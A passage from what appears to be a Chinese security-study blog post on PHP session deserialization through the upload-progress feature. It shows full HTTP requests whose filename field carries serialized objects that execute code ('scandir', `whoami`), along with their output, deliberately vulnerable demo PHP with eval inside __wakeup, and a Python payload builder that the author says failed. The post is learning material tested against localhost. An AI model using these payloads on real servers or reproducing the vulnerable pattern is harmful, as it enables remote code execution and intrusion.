+</span></span><span class=line><span class=cl>POST /1.php HTTP/1.1
+</span></span><span class=line><span class=cl>Host: localhost
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Content-Type: multipart/form-data; boundary=---------------------------82030870339145711343728112542
+</span></span><span class=line><span class=cl>Content-Length: 442
+</span></span><span class=line><span class=cl>Origin: null
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>Cookie: PHPSESSID=9nto3pe3h7dme2cfv830usftqj
+</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
+</span></span><span class=line><span class=cl>Sec-Fetch-Dest: document
+</span></span><span class=line><span class=cl>Sec-Fetch-Mode: navigate
+</span></span><span class=line><span class=cl>Sec-Fetch-Site: cross-site
+</span></span><span class=line><span class=cl>Sec-Fetch-User: ?1
+</span></span><span class=line><span class=cl>Priority: u=0, i
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>-----------------------------82030870339145711343728112542
+</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>2333
+</span></span><span class=line><span class=cl>-----------------------------82030870339145711343728112542
+</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;|O:5:\&#34;OowoO\&#34;:1:{s:4:\&#34;mdzz\&#34;;s:36:\&#34;print_r(scandir(dirname(__FILE__)));\&#34;;}&#34;
+</span></span><span class=line><span class=cl>Content-Type: application/octet-stream
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>test
+</span></span><span class=line><span class=cl>-----------------------------82030870339145711343728112542--
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>Response</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=ne>Array</span>
+</span></span><span class=line><span class=cl><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=&gt;</span> <span class=o>.</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=&gt;</span> <span class=o>..</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=&gt;</span> <span class=o>.</span><span class=n>htaccess</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=&gt;</span> <span class=o>.</span><span class=n>vscode</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=&gt;</span> <span class=mf>1.</span><span class=n>php</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>=&gt;</span> <span class=mf>2.</span><span class=n>php</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>6</span><span class=p>]</span> <span class=o>=&gt;</span> <span class=mf>3.</span><span class=n>php</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>=&gt;</span> <span class=n>error</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>8</span><span class=p>]</span> <span class=o>=&gt;</span> <span class=n>flag</span><span class=o>.</span><span class=n>php</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>9</span><span class=p>]</span> <span class=o>=&gt;</span> <span class=n>index</span><span class=o>.</span><span class=n>html</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=o>=&gt;</span> <span class=n>nginx</span><span class=o>.</span><span class=n>htaccess</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>11</span><span class=p>]</span> <span class=o>=&gt;</span> <span class=n>rips</span><span class=o>-</span><span class=n>Chinese</span><span class=o>-</span><span class=n>master</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>12</span><span class=p>]</span> <span class=o>=&gt;</span> <span class=n>uploads</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>13</span><span class=p>]</span> <span class=o>=&gt;</span> <span class=n>www</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>RCE也是可以打的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=n>Request</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>POST</span><span class=w> </span><span class=o>/</span><span class=mi>1</span><span class=p>.</span><span class=n>php</span><span class=w> </span><span class=n>HTTP</span><span class=o>/</span><span class=mi>1</span><span class=p>.</span><span class=mi>1</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Host</span><span class=p>:</span><span class=w> </span><span class=n>localhost</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>User</span><span class=o>-</span><span class=n>Agent</span><span class=p>:</span><span class=w> </span><span class=n>Mozilla</span><span class=o>/</span><span class=mi>5</span><span class=p>.</span><span class=mi>0</span><span class=w> </span><span class=p>(</span><span class=n>Windows</span><span class=w> </span><span class=n>NT</span><span class=w> </span><span class=mi>10</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>Win64</span><span class=p>;</span><span class=w> </span><span class=n>x64</span><span class=p>;</span><span class=w> </span><span class=n>rv</span><span class=p>:</span><span class=mi>130</span><span class=p>.</span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=n>Gecko</span><span class=o>/</span><span class=mi>20100101</span><span class=w> </span><span class=n>Firefox</span><span class=o>/</span><span class=mi>130</span><span class=p>.</span><span class=mi>0</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Accept</span><span class=p>:</span><span class=w> </span><span class=kt>text</span><span class=o>/</span><span class=n>html</span><span class=p>,</span><span class=n>application</span><span class=o>/</span><span class=n>xhtml</span><span class=o>+</span><span class=n>xml</span><span class=p>,</span><span class=n>application</span><span class=o>/</span><span class=n>xml</span><span class=p>;</span><span class=n>q</span><span class=o>=</span><span class=mi>0</span><span class=p>.</span><span class=mi>9</span><span class=p>,</span><span class=n>image</span><span class=o>/</span><span class=n>avif</span><span class=p>,</span><span class=n>image</span><span class=o>/</span><span class=n>webp</span><span class=p>,</span><span class=n>image</span><span class=o>/</span><span class=n>png</span><span class=p>,</span><span class=n>image</span><span class=o>/</span><span class=n>svg</span><span class=o>+</span><span class=n>xml</span><span class=p>,</span><span class=o>*</span><span class=cm>/*;q=0.8
+</span></span></span><span class=line><span class=cl><span class=cm>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span></span><span class=line><span class=cl><span class=cm>Accept-Encoding: gzip, deflate
+</span></span></span><span class=line><span class=cl><span class=cm>Content-Type: multipart/form-data; boundary=---------------------------82030870339145711343728112542
+</span></span></span><span class=line><span class=cl><span class=cm>Content-Length: 420
+</span></span></span><span class=line><span class=cl><span class=cm>Origin: null
+</span></span></span><span class=line><span class=cl><span class=cm>Connection: close
+</span></span></span><span class=line><span class=cl><span class=cm>Cookie: PHPSESSID=9nto3pe3h7dme2cfv830usftqj
+</span></span></span><span class=line><span class=cl><span class=cm>Upgrade-Insecure-Requests: 1
+</span></span></span><span class=line><span class=cl><span class=cm>Sec-Fetch-Dest: document
+</span></span></span><span class=line><span class=cl><span class=cm>Sec-Fetch-Mode: navigate
+</span></span></span><span class=line><span class=cl><span class=cm>Sec-Fetch-Site: cross-site
+</span></span></span><span class=line><span class=cl><span class=cm>Sec-Fetch-User: ?1
+</span></span></span><span class=line><span class=cl><span class=cm>Priority: u=0, i
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>-----------------------------82030870339145711343728112542
+</span></span></span><span class=line><span class=cl><span class=cm>Content-Disposition: form-data; name=&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>2333
+</span></span></span><span class=line><span class=cl><span class=cm>-----------------------------82030870339145711343728112542
+</span></span></span><span class=line><span class=cl><span class=cm>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;|O:5:\&#34;OowoO\&#34;:1:{s:4:\&#34;mdzz\&#34;;s:14:\&#34;echo `whoami`;\&#34;;}&#34;
+</span></span></span><span class=line><span class=cl><span class=cm>Content-Type: application/octet-stream
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>test
+</span></span></span><span class=line><span class=cl><span class=cm>-----------------------------82030870339145711343728112542--
+</span></span></span></code></pre></td></tr></table></div></div><p>回显也是正常的</p><h2 id=再思考>再思考</h2><p>我测试之后发现网上的Demo没有一个是<code>php_binary</code>的，所以打算本地尝试一下</p><p>1.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;session.serialize_handler&#39;</span><span class=p>,</span> <span class=s1>&#39;php_binary&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Test</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>    <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>code</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>2.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;session.serialize_handler&#39;</span><span class=p>,</span> <span class=s1>&#39;php_serialize&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;test&#39;</span><span class=p>])){</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;test&#39;</span><span class=p>]</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;test&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>首先利用我们之前写的Demo看看这个引擎是怎么储存类的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>baos:44:&#34;O:4:&#34;Test&#34;:1:{s:4:&#34;code&#34;;s:10:&#34;phpinfo();&#34;;}&#34;;
+</span></span></code></pre></td></tr></table></div></div><p>那么这里有个不可视字符并且我们是需要去自己写类似的字符串，并且算出字符个数</p><p>这个写个EXP</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>urllib.parse</span> <span class=kn>import</span> <span class=n>quote</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=s1>&#39;O:4:&#34;Test&#34;:1:{s:4:&#34;code&#34;;s:10:&#34;phpinfo();&#34;;}&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>quote</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span><span class=o>+</span><span class=s1>&#39;tests:44:&#34;O:4:&#34;Test&#34;:1:{s:4:&#34;code&#34;;s:10:&#34;phpinfo();&#34;;}&#34;&#39;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>但是这样子并没有打通</p><p>后面进行类比了一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>%04testO:4:&#34;Test&#34;:1:{s:4:&#34;code&#34;;s:10:&#34;phpinfo();&#34;;}
+</span></span></code></pre></td></tr></table></div></div><p>也还是不行，这个洞不懂，如果有师傅知道，可以一起讨论一下</p><h1 id=0x03-小结>0x03 小结</h1><p>终于把session反序列化搞的有点东西了，虽然中途Demo3抓包由于是本地不好抓，但是最后抓到一次就行了，这周的第一次学习吧，前面都在忙行政的事，中秋节好好利用一下，最后那个思考说实话超出我能力范围了，网上也没有参考，不知道有没有这种利用方式</p></section><footer class=article-footer><section class=article-tags><a href=/tags/%E5%A7%BF%E5%8A%BF/>姿势</a>
+<a href=/tags/session/>Session</a></section><section class=article-references><div class=article-references__header><span class=article-references__icon><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+</span><span>参考阅读</span></div><ol class=article-references__list><li><a href=https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled%29 target=_blank rel=noopener>https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled)</a></li><li><a href=https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name%29%e5%90%8c%e5%90%8d%e5%8f%98%e9%87%8f%e6%97%b6%ef%bc%8c%e4%b8%8a%e4%bc%a0%e8%bf%9b%e5%ba%a6%e5%8f%af%e4%bb%a5%e5%9c%a8[$_SESSION]%28https://www.php.net/manual/zh/reserved.variables.session.php%29%e4%b8%ad%e8%8e%b7%e5%be%97%e3%80%82 target=_blank rel=noopener>https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name)同名变量时，上传进度可以在[$_SESSION](https://www.php.net/manual/zh/reserved.variables.session.php)中获得。</a></li><li><a href=https://www.php.net/manual/zh/reserved.variables.session.php%29%e4%b8%ad%e6%b7%bb%e5%8a%a0%e4%b8%80%e7%bb%84%e6%95%b0%e6%8d%ae, target=_blank rel=noopener>https://www.php.net/manual/zh/reserved.variables.session.php)中添加一组数据,</a></li><li><a href=https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix%29 target=_blank rel=noopener>https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix)</a></li><li><a href=https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name%29%e8%bf%9e%e6%8e%a5%e5%9c%a8%e4%b8%80%e8%b5%b7%e7%9a%84%e5%80%bc%e3%80%82 target=_blank rel=noopener>https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name)连接在一起的值。</a></li><li><a href=https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled target=_blank rel=noopener>https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled</a></li><li><a href=https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name target=_blank rel=noopener>https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name</a></li><li><a href=https://www.php.net/manual/zh/reserved.variables.session.php target=_blank rel=noopener>https://www.php.net/manual/zh/reserved.variables.session.php</a></li><li><a href=https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix target=_blank rel=noopener>https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix</a></li></ol></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>
